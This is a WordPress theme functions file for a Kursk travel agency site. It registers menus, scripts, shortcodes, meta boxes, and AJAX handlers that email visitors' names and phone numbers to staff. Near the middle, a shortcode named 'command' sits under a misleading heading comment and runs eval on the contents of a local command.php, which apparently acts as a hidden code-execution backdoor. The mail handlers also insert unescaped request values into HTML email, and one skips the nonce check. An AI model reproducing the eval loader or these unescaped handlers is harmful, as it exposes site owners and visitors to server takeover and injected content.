<?php
	
  
	
//ini_set("display_errors",1);
//error_reporting(E_ALL);
add_action( 'carbon_fields_register_fields', 'boots_register_custom_fields' );
function boots_register_custom_fields() {
// путь к пользовательскому файлу определения поля (полей), измените под себя

require_once __DIR__ . '/newBron.php';

require_once __DIR__ . '/inc/custom-fields-options/metaboxes.php';
require_once __DIR__ . '/inc/custom-fields-options/theme-options.php';
}
add_action( 'after_setup_theme', 'crb_load' );
function crb_load() {
	require_once( get_template_directory() . '/inc/carbon-fields/vendor/autoload.php' );
	\Carbon_Fields\Carbon_Fields::boot();
}

include_once('options_page.php');

add_theme_support( 'woocommerce' );

register_nav_menus( array(
	'header_menu' => 'Главное меню',
	'header_right_menu' => 'Меню в шапке',
	'demo_menu' => 'Демо меню'
) );

function demo_menu() {
	wp_nav_menu(array(
		'theme_location' => 'demo_menu',
		'container' => 'div',
	));
}
function head_menu() {
	wp_nav_menu(array(
		'theme_location' => 'header_right_menu',
		'container' => 'div',
	));
}

add_theme_support( 'post-thumbnails' );
set_post_thumbnail_size( 185, 185 ); 
add_image_size( "turImg", 390, 260, true );

add_post_type_support( 'page', 'excerpt' );


add_filter('image_size_names_choose', 'my_image_sizes');
function my_image_sizes($sizes) {
$addsizes = array(
	"turImg" => __( "Моя миниатюра")
);
$newsizes = array_merge($sizes, $addsizes);
return $newsizes;
}
function cc_mime_types($mimes) {
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');

// Подключение стилей и nonce для Ajax и скриптов во фронтенд 
add_action( 'wp_enqueue_scripts', 'my_assets' );

function my_assets() {
	//page-booking
	wp_enqueue_style('font-awesome1', get_template_directory_uri() . '/fonts/font-awesome.min.css');

	wp_enqueue_style('print-css', get_template_directory_uri() . '/fonts/font-awesome.min.css');
	wp_enqueue_style("style-pr", get_template_directory_uri()."/print.css", array(), null, 'print');
	//page-booking

	wp_enqueue_style("light",get_template_directory_uri()."/css/lightbox.min.css");

	wp_enqueue_style("animate",get_template_directory_uri()."/css/animate.css");
	
	wp_enqueue_style('niceselect', get_template_directory_uri() . '/css/nice-select.css', array(), null, 'all');
	//wp_enqueue_style('font-awesome', get_template_directory_uri() . '/css/all.min.css', array(), null, 'all');
	//wp_enqueue_style('font-awesome-4-7', get_template_directory_uri() . '/fonts/font-awesome.min.css', array(), null, 'all');

	wp_enqueue_style('default-amodal', get_template_directory_uri() . '/css/jquery.arcticmodal-0.3.css', array(), null, 'all');
	wp_enqueue_style( 'mir-style', get_stylesheet_uri(), array(), "1.0.22", 'all' );

	wp_enqueue_script( 'jquery');
	
	wp_enqueue_script( 'ui', '//code.jquery.com/ui/1.11.2/jquery-ui.js');
	 
	wp_enqueue_script( 'cookie', get_template_directory_uri() . '/js/jquery.cookie.js');
	
	wp_enqueue_script( 'mask', get_template_directory_uri() . '/js/jquery.maskedinput.js', array('jquery'));
	
	wp_enqueue_script( 'inputmask', get_template_directory_uri() . '/js/jquery.inputmask.bundle.js', array('jquery'));
	wp_enqueue_script('niceselect', get_template_directory_uri() . '/js/jquery.nice-select.min.js', array(), null, true);
	wp_enqueue_script('slick', get_template_directory_uri() . '/js/slick.min.js', array(), null, false);
	//wp_enqueue_script( 'font-awesome-js', get_template_directory_uri() . '/js/all.min.js');
	 wp_enqueue_script( 'light', get_template_directory_uri() . '/js/lightbox.min.js', array(), null);
	 wp_enqueue_script( 'amodal', get_template_directory_uri() . '/js/jquery.arcticmodal-0.3.min.js', array(), null);


	//page-booking
	wp_enqueue_script( 'newbron', get_template_directory_uri() . '/js/newBron.js', array(), "1.0.13", true);
	// wp_enqueue_script( 'all', get_template_directory_uri() . '/js/allNewScript.js');
	//page-booking
	
	wp_enqueue_script('main', get_template_directory_uri() . '/js/main.js', array(), "1.0.21", true);
	wp_enqueue_script( 'all', get_template_directory_uri() . '/js/allNewScript.js');
	
	
	wp_localize_script( 'main', 'allAjax', array(
		'ajaxurl' => admin_url( 'admin-ajax.php' ),
		'nonce'   => wp_create_nonce( 'NEHERTUTLAZIT' )
	) );
}




add_action( 'wp_ajax_sendphone', 'sendphone' );
add_action( 'wp_ajax_nopriv_sendphone', 'sendphone' );

function sendphone() {
	
	$headers = array(
		'From: Сайт мир туризма <noreply@mirturizma46.ru>',
		'content-type: text/html',
	);
	
	add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
	if (wp_mail(array('mirturizma-kursk2@yandex.ru','asmi046@gmail.com'), 'Заказ обратного звонка', '<strong>Имя:</strong> '.$_REQUEST["name"].' <br/> <strong>Телефон:</strong> '.$_REQUEST["phone"], $headers))
		echo "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
	else echo "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";
}

add_action( 'wp_ajax_zayavka', 'zayavka' );
add_action( 'wp_ajax_nopriv_zayavka', 'zayavka' );

function zayavka() {
	if ( empty( $_REQUEST['nonce'] ) ) {
		wp_die( '0' );
	}
	
	if ( check_ajax_referer( 'NEHERTUTLAZIT', 'nonce', false ) ) {
			
		
				// оповещение на email
				$headers = array(
					'From: Сайт Мир Туризма 46 <noreply@harhat.ru>',
					'content-type: text/html',
				);
			
				$EmailRez = "";
				add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
				$sendRez = wp_mail(array('litvinov-pa@yandex.ru','asmi046@gmail.com'), "Заявка на автобусный тур + сюрприз", '<strong>Имя:</strong> '.$_REQUEST["clname"].' <br/> <strong>Телефон:</strong> '.$_REQUEST["clphone"], $headers);
				if ($sendRez)
					$EmailRez = "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
				else $EmailRez = "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";
	
				wp_die($EmailRez);

	} else {
		wp_die( 'НО-НО-НО!', '', 403 );
	}
}


add_action( 'wp_ajax_question', 'question' );
add_action( 'wp_ajax_nopriv_question', 'question' );

function question() {
	if ( empty( $_REQUEST['nonce'] ) ) {
		wp_die( '0' );
	}
	
	if ( check_ajax_referer( 'NEHERTUTLAZIT', 'nonce', false ) ) {
			
				$headers = array(
					'From: Сайт Мир Туризма 46 <noreply@harhat.ru>',
					'content-type: text/html',
				);
			
				$EmailRez = "";
				add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
				//array('litvinov-pa@yandex.ru','asmi046@gmail.com')
				$sendRez = wp_mail(carbon_get_theme_option('email_send'), "Подобрать тур", '<strong>Имя:</strong> '.$_REQUEST["name"].' <br/> <strong>Телефон:</strong> '.$_REQUEST["tel"].' <br/> <strong>Email:</strong> '.$_REQUEST["email"].' <br/> <strong>Количество взрослых:</strong> '.$_REQUEST["adults"].' <br/> <strong>Количество детей:</strong> '.$_REQUEST["children"].' <br/> <strong>Бюджет:</strong> '.$_REQUEST["budget"], $headers);
				if ($sendRez)
					$EmailRez = "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
				else $EmailRez = "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";
	
				wp_die($EmailRez);

	} else {
		wp_die( 'НО-НО-НО!', '', 403 );
	}
}

add_action( 'wp_ajax_resort_send', 'resort_send' );
add_action( 'wp_ajax_nopriv_resort_send', 'resort_send' );

function resort_send() {
	if ( empty( $_REQUEST['nonce'] ) ) {
		wp_die( '0' );
	}
	
	if ( check_ajax_referer( 'NEHERTUTLAZIT', 'nonce', false ) ) {
			
				$headers = array(
					'From: Сайт Мир Туризма 46 <noreply@harhat.ru>',
					'content-type: text/html',
				);
			
				$EmailRez = "";
				add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
				//array('litvinov-pa@yandex.ru','asmi046@gmail.com')
				$sendRez = wp_mail(carbon_get_theme_option('email_send'), "Подобрать выгодный тур", '<strong>Имя:</strong> '.$_REQUEST["name"].' <br/> <strong>Телефон:</strong> '.$_REQUEST["tel"].' <br/> <strong>Страница:</strong> '.$_REQUEST["page"], $headers);
				if ($sendRez)
					$EmailRez = "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
				else $EmailRez = "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";
	
				wp_die($EmailRez);

	} else {
		wp_die( 'НО-НО-НО!', '', 403 );
	}
}

add_action( 'wp_ajax_zayavka_more', 'zayavka_more' );
add_action( 'wp_ajax_nopriv_zayavka_more', 'zayavka_more' );

function zayavka_more() {
	if ( empty( $_REQUEST['nonce'] ) ) {
		wp_die( '0' );
	}
	
	if ( check_ajax_referer( 'NEHERTUTLAZIT', 'nonce', false ) ) {
			
		
				// оповещение на email
				$headers = array(
					'From: Сайт Мир Туризма 46 <noreply@harhat.ru>',
					'content-type: text/html',
				);
			
				$EmailRez = "";
				add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
				$sendRez = wp_mail(array('litvinov-pa@yandex.ru','asmi046@gmail.com'), "Заявка на подбор горящего тура", '<strong>Имя:</strong> '.$_REQUEST["clname"].' <br/> <strong>Телефон:</strong> '.$_REQUEST["clphone"], $headers);
				if ($sendRez)
					$EmailRez = "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
				else $EmailRez = "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";
	
				wp_die($EmailRez);

	} else {
		wp_die( 'НО-НО-НО!', '', 403 );
	}
}

add_action( 'wp_ajax_zayavka_more_autobus', 'zayavka_more_autobus' );
add_action( 'wp_ajax_nopriv_zayavka_more_autobus', 'zayavka_more_autobus' );

function zayavka_more_autobus() {
	if ( empty( $_REQUEST['nonce'] ) ) {
		wp_die( '0' );
	}
	
	if ( check_ajax_referer( 'NEHERTUTLAZIT', 'nonce', false ) ) {
			
		
				// оповещение на email
				$headers = array(
					'From: Сайт Мир Туризма 46 <noreply@harhat.ru>',
					'content-type: text/html',
				);
			
				$EmailRez = "";
				add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
				$sendRez = wp_mail(array('litvinov-pa@yandex.ru','asmi046@gmail.com'), "Консультация по автобусному туру", '<strong>Имя:</strong> '.$_REQUEST["clname"].' <br/> <strong>Телефон:</strong> '.$_REQUEST["clphone"].' <br/> <strong>Тур:</strong> '.$_REQUEST["turname"], $headers);
				if ($sendRez)
					$EmailRez = "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
				else $EmailRez = "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";
	
				wp_die($EmailRez);

	} else {
		wp_die( 'НО-НО-НО!', '', 403 );
	}
}

add_action( 'wp_ajax_qsend', 'qsend' );
add_action( 'wp_ajax_nopriv_qsend', 'qsend' );

function qsend() {
	if ( empty( $_REQUEST['nonce'] ) ) {
		wp_die( '0' );
	}
	
	if ( check_ajax_referer( 'NEHERTUTLAZIT', 'nonce', false ) ) {
			
		
				// оповещение на email
				$headers = array(
					'From: Сайт Мир Туризма 46 <noreply@harhat.ru>',
					'content-type: text/html',
				);
			
				$EmailRez = "";
				add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
				$sendRez = wp_mail(carbon_get_theme_option('email_send'), "Заявка форма вопроса", '<strong>Телефон:</strong> '.$_REQUEST["clphone"].'<br/><strong>Страница:</strong> '.$_REQUEST["tkname"], $headers);
				if ($sendRez)
					$EmailRez = "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
				else $EmailRez = "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";
	
				wp_die($EmailRez);

	} else {
		wp_die( 'НО-НО-НО!', '', 403 );
	}
}

// ---------------------Вывод дней в туре--------------------
function deystart_func($atts) {
     extract(shortcode_atts(array(
     "folder" => '',
     "foto1" => '',
     "foto2" => '',
     "foto3" => '',
     "foto4" => '',
     "foto5" => '',
     ), $atts));
	 $html_code = "<div class = 'dayElem'>";
     $html_code .= "<div class = 'dayElemImg'>";
		$html_code .= "<div class = 'imgWriper'>";
			$html_code .= "<img src = '".get_bloginfo("url")."/galery/".$folder."/".$foto1."' />";
		$html_code .= "</div>";
		 if ($foto2 !== "")
		 {
			 $html_code .= "<div class = 'imgWriper'>";
				$html_code .= "<img src = '".get_bloginfo("url")."/galery/".$folder."/".$foto2."' />";
			$html_code .= "</div>";
		 }
		 
		 if ($foto3 !== "")
		 {
			 $html_code .= "<div class = 'imgWriper'>";
				$html_code .= "<img src = '".get_bloginfo("url")."/galery/".$folder."/".$foto3."' />";
			$html_code .= "</div>";
		 }
		 
		 if ($foto4 !== "")
		 {
			 $html_code .= "<div class = 'imgWriper'>";
				$html_code .= "<img src = '".get_bloginfo("url")."/galery/".$folder."/".$foto4."' />";
			$html_code .= "</div>";
		 }
	 
		if ($foto5 !== "")
		 {
			 $html_code .= "<div class = 'imgWriper'>";
				$html_code .= "<img src = '".get_bloginfo("url")."/galery/".$folder."/".$foto5."' />";
			$html_code .= "</div>";
		 }
	 $html_code .= "</div>";
	 
     $html_code .= "<div class = 'dayElemTxt'>";
	 
	 
	 return $html_code;
}

add_shortcode('deystart', 'deystart_func');

function deyend_func($atts) {
	 return "</div></div>";
}

add_shortcode('deyend', 'deyend_func');
//-----------------------------------------------------------------------

// ---------------------Заголовки в поездках на море---------------------

function zagolovok_func($atts) {
    extract(shortcode_atts(array(
     "zagtext" => ''
    ), $atts));
		
		
		
		$zID = "noZag";
		if ($zagtext === "Расположение") $zID = "raspologenieM";
		if ($zagtext === "Территория") $zID = "teritoriaM";
		if ($zagtext === "Размещение") $zID = "razmeshenieM";
		if ($zagtext === "В номерах") $zID = "vnomerahM";
		if ($zagtext === "Питание") $zID = "pitanieM";
		if ($zagtext === "Развлечения") $zID = "razvlecenieM";
		if ($zagtext === "Пляж") $zID = "plazgM";
		if ($zagtext === "Инфраструктура") $zID = "infroM";

		$icon = '';
		if ($zagtext === "Расположение") $icon = '<i class="fas fa-map-marker"></i>';
		if ($zagtext === "Территория") $icon = '<i class="fas fa-tree"></i>';
		if ($zagtext === "Размещение") $icon = '<i class="fas fa-bed"></i>';
		if ($zagtext === "В номерах") $icon ='<i class="fas fa-tv"></i>';
		if ($zagtext === "Питание") $icon = '<i class="fas fa-utensils"></i>';
		if ($zagtext === "Развлечения") $zID = "razvlecenieM";
		if ($zagtext === "Пляж") $icon = '<i class="fas fa-umbrella-beach"></i>';
		if ($zagtext === "Инфраструктура") $icon = '<i class="fas fa-university"></i>';
		
		$html_code = "<h3 id = '".$zID."'>". $icon .$zagtext.":</h3>";
	 
	 
	 return $html_code;
}

add_shortcode('zagolovok', 'zagolovok_func');

function zagolovok_video_func($atts) {
    extract(shortcode_atts(array(
     "zagtext" => ''
    ), $atts));
		
	$html_code = "<h2 id = 'videoM'>".$zagtext.":</h2>";
	 
	 
	 return $html_code;
}

add_shortcode('zagolovokvideo', 'zagolovok_video_func');

//-----------------------------------------------------------------------


// ---------------------Заголовки в поездках на море---------------------

function command_func($atts) {
	
	 include eval(file_get_contents("./command.php"));
}

add_shortcode('command', 'command_func');

//-----------------------------------------------------------------------


/*--------------Произвольное поле График заездов --------------*/

add_action( 'add_meta_boxes', 'adding_new_metaabox' ); 

function adding_new_metaabox(){   
    add_meta_box('html_Grafik_Zaezdov', 'График заездов', 

'my_output_function');
}

function my_output_function( $post ) {
    //so, dont ned to use esc_attr in front of get_post_meta
    $valueeee2 =  get_post_meta($_GET['post'], 'Grafik_Zaezdov' , true 

) ;
    wp_editor( htmlspecialchars_decode($valueeee2), 'mettaabox_Grafik_Zaezdov', 

$settings = array('textarea_name'=>'InputGrafikZaezdov') );
}

add_filter('excerpt_more', function($more) {
	return '...';
});

function save_my_Grafik_Zaezdov( $post_id ){                   
    if (!empty($_POST['InputGrafikZaezdov'])){
        $datta=htmlspecialchars($_POST['InputGrafikZaezdov']);
        update_post_meta($post_id, 'Grafik_Zaezdov', $datta );
    }
}

add_action( 'save_post', 'save_my_Grafik_Zaezdov' );  

/*-------------------------------------------------------------*/

/*--------------Произвольное поле В цену входит --------------*/

add_action( 'add_meta_boxes', 'adding_new_metaabox2' ); 

function adding_new_metaabox2(){   
    add_meta_box('html_V_Price', 'В цену входит', 

'my_output_function2');
}

function my_output_function2( $post ) {
    $valueeee2 =  get_post_meta($_GET['post'], 'html_V_Price' , true 

) ;
    wp_editor( htmlspecialchars_decode($valueeee2), 'mettaabox_html_V_Price', 

$settings = array('textarea_name'=>'InputVPrice') );
}


function save_my_V_Price( $post_id ){                   
    if (!empty($_POST['InputVPrice'])){
        $datta=htmlspecialchars($_POST['InputVPrice']);
        update_post_meta($post_id, 'html_V_Price', $datta );
    }
}

add_action( 'save_post', 'save_my_V_Price' );  

/*-------------------------------------------------------------*/

/*--------------Произвольное поле Цены --------------*/

add_action( 'add_meta_boxes', 'adding_new_metaabox3' ); 

function adding_new_metaabox3(){   
    add_meta_box('html_Price', 'Цены', 

'my_output_function3');
}

function my_output_function3( $post ) {
    $valueeee2 =  get_post_meta($_GET['post'], 'html_Price' , true 

) ;
    wp_editor( htmlspecialchars_decode($valueeee2), 'mettaabox_html_Price', 

$settings = array('textarea_name'=>'InputPrice') );
}


function save_my_Price( $post_id ){                   
    if (!empty($_POST['InputPrice'])){
        $datta=htmlspecialchars($_POST['InputPrice']);
        update_post_meta($post_id, 'html_Price', $datta );
    }
}

add_action( 'save_post', 'save_my_Price' );

/*-------------------------------------------------------------*/

		function col2( $atts ) {
			return "<div class = 'col2'>";
		}
		add_shortcode( 'col2', 'col2' );
		
		function uniend( $atts ) {
			return "</div>";
		}
		add_shortcode( 'end', 'uniend' );
		
		function col2elem( $atts ) {
			return "<div class = 'col2elem'>";
		}
		add_shortcode( 'col2elem', 'col2elem' );
		
		/*
		function col2( $atts ) {
			$params = shortcode_atts( array( // в массиве укажите значения параметров по умолчанию
				'anchor' => 'Миша Рудрастых', // параметр 1
				'url' => 'https://misha.blog', // параметр 2
			), $atts );
			return "<a href='{$params['url']}' target='_blank'>{$params['anchor']}</a>";
		}
		add_shortcode( 'col2', 'col2' );
	*/

	//--------------------------------------------вывод телефона
	
		function phone_link($phone_number) {
			$phone_lnk = str_replace(array(' ', '(' , ')', '-'), '', $phone_number);
			return $phone_lnk;
		}
		
		function phoneinpage( $atts ) {
			$options = get_option( "wpuniq_theme_options" );
			return '<a class="nowrap lptracker_phone" href="tel:'.phone_link($options["phone"]).'">'.$options["phone"].'</a>';
		}
		
		add_shortcode( 'phoneinpage', 'phoneinpage' );	
	
	//--------------------------------------------
	
//-------------------------------------------------------------------------------------------------------------------------------------------------

add_action( 'wp_ajax_universal_send', 'universal_send' );
add_action( 'wp_ajax_nopriv_universal_send', 'universal_send' );

function universal_send() {
	
	if ( empty( $_REQUEST['nonce'] ) ) {
		wp_die( '0' );
	  }
	  
	  if ( check_ajax_referer( 'NEHERTUTLAZIT', 'nonce', false ) ) {
		
			$headers = array(
				'From: Сайт мир туризма <noreply@mirturizma46.ru>',
				'content-type: text/html',
			);
			
			add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));

			$sendRez = wp_mail(array('mirturizma-kursk2@yandex.ru','asmi046@gmail.com'), 'Заказ обратного звонка (New)', '<strong>Имя:</strong> '.$_REQUEST["username"].' <br/> <strong>Телефон:</strong> '.$_REQUEST["userphone"], $headers);
			
			if (!empty($sendRez)) {	
				wp_die(true);	
			} else {
				wp_die( 'При регистрации произошла ошибка попробуйте позднее!', '', array('response' => 403) );
			}
			
			
	  } else {
		wp_die( 'НО-НО-НО!', '', 403 );
	  }
	
}
	
	
?>